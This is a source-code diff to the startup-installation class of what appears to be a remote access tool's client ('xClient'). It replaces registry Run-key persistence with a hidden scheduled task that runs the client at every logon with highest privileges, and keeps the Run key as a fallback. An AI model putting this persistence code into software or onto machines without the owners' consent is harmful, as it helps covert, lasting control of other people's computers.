@@ -1,4 +1,6 @@
-﻿using Microsoft.Win32;
+﻿using System;
+using System.Diagnostics;
+using Microsoft.Win32;
 using xClient.Config;
 using xClient.Core.Data;
 using xClient.Core.Helper;
@@ -7,22 +9,26 @@ namespace xClient.Core.Installation
 {
     public static class Startup
     {
-        // ReSharper disable InconsistentNaming
-        private static string GetHKLMPath()
-        {
-            return (PlatformHelper.Is64Bit)
-                ? "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"
-                : "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
-        }
-
         public static bool AddToStartup()
         {
             if (WindowsAccountHelper.GetAccountType() == "Admin")
             {
-                bool success = RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine, GetHKLMPath(),
-                    Settings.STARTUPKEY, ClientData.CurrentPath, true);
+                try
+                {
+                    ProcessStartInfo startInfo = new ProcessStartInfo("schtasks")
+                    {
+                        Arguments = "/create /tn \"" + Settings.STARTUPKEY + "\" /sc ONLOGON /tr \"" + ClientData.CurrentPath + "\" /rl HIGHEST /f",
+                        UseShellExecute = false,
+                        CreateNoWindow = true
+                    };
 
-                if (success) return true;
+                    Process p = Process.Start(startInfo);
+                    p.WaitForExit(1000);
+                    if (p.ExitCode == 0) return true;
+                }
+                catch (Exception)
+                {
+                }
 
                 return RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
                     "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Settings.STARTUPKEY, ClientData.CurrentPath,
@@ -40,10 +46,22 @@ namespace xClient.Core.Installation
         {
             if (WindowsAccountHelper.GetAccountType() == "Admin")
             {
-                bool success = RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine, GetHKLMPath(),
-                    Settings.STARTUPKEY);
+                try
+                {
+                    ProcessStartInfo startInfo = new ProcessStartInfo("schtasks")
+                    {
+                        Arguments = "/delete /tn \"" + Settings.STARTUPKEY + "\" /f",
+                        UseShellExecute = false,
+                        CreateNoWindow = true
+                    };
 
-                if (success) return true;
+                    Process p = Process.Start(startInfo);
+                    p.WaitForExit(1000);
+                    if (p.ExitCode == 0) return true;
+                }
+                catch (Exception)
+                {
+                }
 
                 return RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser,
                     "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Settings.STARTUPKEY);
